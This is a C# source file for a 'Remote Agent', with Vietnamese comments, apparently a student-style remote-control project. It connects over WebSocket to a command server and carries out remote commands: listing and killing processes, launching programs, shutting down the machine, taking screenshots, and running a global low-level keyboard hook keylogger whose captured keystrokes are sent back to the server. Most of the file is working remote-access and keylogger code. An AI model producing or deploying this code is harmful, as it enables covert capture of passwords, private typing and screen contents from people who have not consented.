using Newtonsoft.Json;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net.WebSockets;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteAgent
{
    class Program
    {
        static ClientWebSocket? webSocket;
        static bool isConnected = false;

        // --- CHỐNG KẸT MẠNG (Đa luồng an toàn) ---
        static readonly SemaphoreSlim _socketLock = new SemaphoreSlim(1, 1);

        // Keylogger variables
        static bool isKeyloggerRunning = false;
        static StringBuilder keyBuffer = new StringBuilder();
        static CancellationTokenSource? keyloggerCts;

        // --- WINDOWS API ---
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]
        private static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags);
        [StructLayout(LayoutKind.Sequential)] struct MSG { public IntPtr hwnd; public uint message; public IntPtr wParam; public IntPtr lParam; public uint time; public POINT pt; }
        [StructLayout(LayoutKind.Sequential)] struct POINT { public int x; public int y; }
        [DllImport("user32.dll")] static extern bool GetMessage(out MSG lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);
        [DllImport("user32.dll")] static extern bool TranslateMessage(ref MSG lpMsg);
        [DllImport("user32.dll")] static extern IntPtr DispatchMessage(ref MSG lpMsg);
        [DllImport("user32.dll")] static extern int GetSystemMetrics(int nIndex);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        static async Task Main(string[] args)
        {
            Console.OutputEncoding = Encoding.UTF8;
            Console.WriteLine("===========================================");
            Console.WriteLine("    REMOTE AGENT - FULL FEATURES v2.0      ");
            Console.WriteLine("===========================================");

            string serverUrl = "ws://localhost:5000/ws/agent";
            if (args.Length >= 1)
            {
                var host = args[0];
                if (host.StartsWith("ws://") || host.StartsWith("wss://")) serverUrl = host;
                else if (host.Contains("ngrok")) serverUrl = $"wss://{host}/ws/agent";
                else serverUrl = $"ws://{host}:5000/ws/agent";
                if (!serverUrl.EndsWith("/ws/agent")) serverUrl = serverUrl.TrimEnd('/') + "/ws/agent";
            }

            Console.WriteLine($"Host: {serverUrl}");

            while (true)
            {
                try
                {
                    await ConnectToServer(serverUrl);
                    await ListenForCommands();
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Lỗi kết nối: {ex.Message}. Thử lại sau 5s...");
                    await Task.Delay(5000);
                }
            }
        }
        static async Task<string?> ReceiveFullTextMessage(ClientWebSocket ws, CancellationToken ct)
        {
            var chunk = new byte[16 * 1024];
            using var ms = new MemoryStream();

            while (true)
            {
                var r = await ws.ReceiveAsync(new ArraySegment<byte>(chunk), ct);

                if (r.MessageType == WebSocketMessageType.Close)
                    return null;

                ms.Write(chunk, 0, r.Count);

                if (r.EndOfMessage)
                    break;
            }

            return Encoding.UTF8.GetString(ms.ToArray());
        }

        static async Task ConnectToServer(string url)
        {
            webSocket = new ClientWebSocket();
            webSocket.Options.SetBuffer(64 * 1024, 64 * 1024);
            await webSocket.ConnectAsync(new Uri(url), CancellationToken.None);
            isConnected = true;
            Console.WriteLine("--> Đã kết nối thành công!");
        }

        static async Task ListenForCommands()
        {
            var buffer = new byte[1024 * 4];
            while (isConnected && webSocket != null && webSocket.State == WebSocketState.Open)
            {
                try
                {
                    var result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                    if (result.MessageType == WebSocketMessageType.Close) { isConnected = false; break; }

                    string command = Encoding.UTF8.GetString(buffer, 0, result.Count);
                    Console.WriteLine($"[Received]: {command}");

                    _ = Task.Run(async () => await ProcessCommand(command));
                }
                catch { isConnected = false; break; }
            }
        }

        static async Task ProcessCommand(string command)
        {
            try
            {
                var parts = command.Split('|');
                string cmd = parts[0].ToUpper();

                switch (cmd)
                {
                    case "LIST_APPS": await ListApplications(); break;
                    case "LIST_PROCESSES": await ListProcesses(); break;
                    case "START_PROCESS": if (parts.Length > 1) await StartProcess(parts[1]); break;
                    case "KILL_PROCESS": if (parts.Length > 1) await KillProcess(int.Parse(parts[1])); break;
                    case "SHUTDOWN": await ShutdownComputer(); break;
                    case "RESTART": await RestartComputer(); break;
                    case "PING": await SendResponse("PONG", "OK"); break;
                    case "DISABLE_WEBCAM": await DisableWebcam(); break;
                    case "ENABLE_WEBCAM": await EnableWebcam(); break;
                    case "SCREENSHOT": await TakeScreenshot(); break;
                    case "START_KEYLOGGER": await StartKeylogger(); break;
                    case "STOP_KEYLOGGER": await StopKeylogger(); break;
                    case "GET_KEYLOG": string keylog = GetKeylog(); await SendResponse("KEYLOG", keylog); break;
                    default: await SendResponse("ERROR", "Lệnh không hợp lệ"); break;
                }
            }
            catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
        }

        // --- HÀM LẤY DANH SÁCH ỨNG DỤNG (ĐÃ SỬA ĐỂ HIỆN FULL) ---
        static async Task ListApplications()
        {
            var apps = new List<object>();
            var processes = Process.GetProcesses();

            foreach (var process in processes)
            {
                try
                {
                    // Chỉ lấy những process có cửa sổ giao diện
                    if (process.MainWindowHandle == IntPtr.Zero) continue;

                    string name = process.ProcessName;

                    // SỬA: Bỏ "ApplicationFrameHost" khỏi danh sách chặn để hiện Calculator, Photos...
                    if (name == "TextInputHost" || name == "SearchHost" || name == "SystemSettings") continue;

                    string title = "";
                    try { title = process.MainWindowTitle; } catch { }

                    // Nếu title rỗng, dùng tên process
                    if (string.IsNullOrEmpty(title)) title = name;

                    apps.Add(new { Name = name, Title = title, Id = process.Id, Threads = 0, Memory = 0 });
                }
                catch { continue; }
            }
            string json = JsonConvert.SerializeObject(apps);
            await SendResponse("APPS", json);
        }

        static async Task ListProcesses()
        {
            var processes = new List<object>();
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    processes.Add(new { Name = process.ProcessName, Id = process.Id, Memory = 0 });
                }
                catch { }
            }
            await SendResponse("PROCESSES", JsonConvert.SerializeObject(processes));
        }

        // --- HÀM GỬI DỮ LIỆU VỀ SERVER (CÓ KHÓA LOCK) ---
        static async Task SendResponse(string type, string data)
        {
            await _socketLock.WaitAsync(); // Chờ đến lượt
            try
            {
                if (webSocket != null && webSocket.State == WebSocketState.Open)
                {
                    byte[] b = Encoding.UTF8.GetBytes($"{type}|{data}");
                    await webSocket.SendAsync(new ArraySegment<byte>(b), WebSocketMessageType.Text, true, CancellationToken.None);
                    Console.WriteLine($"--> Sent: {type}");
                }
            }
            catch { }
            finally { _socketLock.Release(); } // Xong việc thì mở khóa
        }

        static async Task StartProcess(string processName)
        {
            try { Process.Start(new ProcessStartInfo { FileName = processName, UseShellExecute = true }); await SendResponse("SUCCESS", $"Đã mở: {processName}"); }
            catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
        }

        static async Task KillProcess(int processId)
        {
            try { Process.GetProcessById(processId).Kill(); await SendResponse("SUCCESS", $"Đã tắt ID: {processId}"); }
            catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
        }

        static async Task ShutdownComputer() { await SendResponse("SUCCESS", "Đang tắt máy..."); Process.Start("shutdown", "/s /t 10"); }
        static async Task RestartComputer() { await SendResponse("SUCCESS", "Đang khởi động lại..."); Process.Start("shutdown", "/r /t 10"); }

        static async Task TakeScreenshot()
        {
            try
            {
                int w = GetSystemMetrics(0); int h = GetSystemMetrics(1);
                using (Bitmap bmp = new Bitmap(w, h))
                {
                    using (Graphics g = Graphics.FromImage(bmp)) g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        var encoder = ImageCodecInfo.GetImageEncoders().First(c => c.FormatID == ImageFormat.Jpeg.Guid);
                        var para = new EncoderParameters(1); para.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, 30L);
                        bmp.Save(ms, encoder, para);
                        await SendResponse("SCREENSHOT", Convert.ToBase64String(ms.ToArray()));
                    }
                }
            }
            catch (Exception ex) { await SendResponse("ERROR", ex.Message); }
        }

        static async Task DisableWebcam() { await SendResponse("SUCCESS", "Đã gửi lệnh tắt Webcam"); }
        static async Task EnableWebcam() { await SendResponse("SUCCESS", "Đã gửi lệnh bật Webcam"); }

        // ==================== KEYLOGGER (ĐÃ NÂNG CẤP ĐẦY ĐỦ PHÍM) ====================
        static async Task StartKeylogger()
        {
            if (isKeyloggerRunning) { await SendResponse("SUCCESS", "Đang chạy"); return; }
            keyloggerCts = new CancellationTokenSource(); isKeyloggerRunning = true; keyBuffer.Clear();
            Task.Run(() =>
            {
                try
                {
                    using (var p = Process.GetCurrentProcess()) using (var m = p.MainModule!)
                        _hookID = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, GetModuleHandle(m.ModuleName), 0);
                    MSG msg; while (!keyloggerCts.Token.IsCancellationRequested && GetMessage(out msg, IntPtr.Zero, 0, 0)) { TranslateMessage(ref msg); DispatchMessage(ref msg); }
                }
                catch { }
            }, keyloggerCts.Token);
            await SendResponse("SUCCESS", "Keylogger bắt đầu");
        }

        static async Task StopKeylogger()
        {
            if (!isKeyloggerRunning) return;
            isKeyloggerRunning = false; keyloggerCts?.Cancel();
            if (_hookID != IntPtr.Zero) { UnhookWindowsHookEx(_hookID); _hookID = IntPtr.Zero; }
            await SendResponse("SUCCESS", "Keylogger đã dừng");
        }

        static string GetKeylog() { lock (keyBuffer) { return keyBuffer.ToString(); } }

        static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string keyLog = "";
                bool isSpecial = true;

                // Xử lý các phím đặc biệt
                switch ((Keys)vkCode)
                {
                    case Keys.Back: keyLog = "[BACK]"; break;
                    case Keys.Tab: keyLog = "[TAB]"; break;
                    case Keys.Enter: keyLog = "[ENTER]\n"; break;
                    case Keys.Escape: keyLog = "[ESC]"; break;
                    case Keys.Space: keyLog = " "; break;
                    case Keys.PageUp: keyLog = "[PgUp]"; break;
                    case Keys.PageDown: keyLog = "[PgDn]"; break;
                    case Keys.End: keyLog = "[END]"; break;
                    case Keys.Home: keyLog = "[HOME]"; break;
                    case Keys.Left: keyLog = "[LEFT]"; break;
                    case Keys.Up: keyLog = "[UP]"; break;
                    case Keys.Right: keyLog = "[RIGHT]"; break;
                    case Keys.Down: keyLog = "[DOWN]"; break;
                    case Keys.PrintScreen: keyLog = "[PrtSc]"; break;
                    case Keys.Insert: keyLog = "[INS]"; break;
                    case Keys.Delete: keyLog = "[DEL]"; break;
                    // ĐÃ THÊM ALT VÀ WIN
                    case Keys.LMenu: case Keys.RMenu: keyLog = "[ALT]"; break;
                    case Keys.LWin: case Keys.RWin: keyLog = "[WIN]"; break;
                    case Keys.LControlKey: case Keys.RControlKey: keyLog = "[CTRL]"; break;
                    case Keys.CapsLock: keyLog = "[CAPS]"; break;
                    // Phím F
                    case Keys.F1: keyLog = "[F1]"; break;
                    case Keys.F2: keyLog = "[F2]"; break;
                    case Keys.F3: keyLog = "[F3]"; break;
                    case Keys.F4: keyLog = "[F4]"; break;
                    case Keys.F5: keyLog = "[F5]"; break;
                    case Keys.F6: keyLog = "[F6]"; break;
                    case Keys.F7: keyLog = "[F7]"; break;
                    case Keys.F8: keyLog = "[F8]"; break;
                    case Keys.F9: keyLog = "[F9]"; break;
                    case Keys.F10: keyLog = "[F10]"; break;
                    case Keys.F11: keyLog = "[F11]"; break;
                    case Keys.F12: keyLog = "[F12]"; break;
                    // Phím Media
                    case Keys.VolumeMute: keyLog = "[MUTE]"; break;
                    case Keys.VolumeDown: keyLog = "[Vol-]"; break;
                    case Keys.VolumeUp: keyLog = "[Vol+]"; break;

                    // Shift không cần ghi log chữ, chỉ cần để xử lý viết hoa
                    case Keys.LShiftKey: case Keys.RShiftKey: isSpecial = false; break;

                    default: isSpecial = false; break;
                }

                if (!isSpecial)
                {
                    byte[] keyState = new byte[256];
                    GetKeyboardState(keyState);
                    StringBuilder sb = new StringBuilder(2);
                    if (ToUnicode((uint)vkCode, 0, keyState, sb, sb.Capacity, 0) > 0) keyLog = sb.ToString();
                }

                if (!string.IsNullOrEmpty(keyLog)) { lock (keyBuffer) { keyBuffer.Append(keyLog); if (keyBuffer.Length > 10000) keyBuffer.Remove(0, 2000); } }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }
    }

    // --- DANH SÁCH MÃ PHÍM ĐẦY ĐỦ (Update từ A-Z) ---
    public enum Keys
    {
        Back = 8, Tab = 9, Enter = 13, Escape = 27, Space = 32,
        PageUp = 33, PageDown = 34, End = 35, Home = 36,
        Left = 37, Up = 38, Right = 39, Down = 40,
        PrintScreen = 44, Insert = 45, Delete = 46,
        D0 = 48, D1 = 49, D2 = 50, D3 = 51, D4 = 52, D5 = 53, D6 = 54, D7 = 55, D8 = 56, D9 = 57,
        A = 65, B = 66, C = 67, D = 68, E = 69, F = 70, G = 71, H = 72, I = 73, J = 74, K = 75, L = 76, M = 77,
        N = 78, O = 79, P = 80, Q = 81, R = 82, S = 83, T = 84, U = 85, V = 86, W = 87, X = 88, Y = 89, Z = 90,
        LWin = 91, RWin = 92,
        F1 = 112, F2 = 113, F3 = 114, F4 = 115, F5 = 116, F6 = 117, F7 = 118, F8 = 119, F9 = 120, F10 = 121, F11 = 122, F12 = 123,
        LShiftKey = 160, RShiftKey = 161, LControlKey = 162, RControlKey = 163,
        LMenu = 164, RMenu = 165, // <-- Đã thêm ALT (Menu Key)
        CapsLock = 20,
        VolumeMute = 173, VolumeDown = 174, VolumeUp = 175
    }
}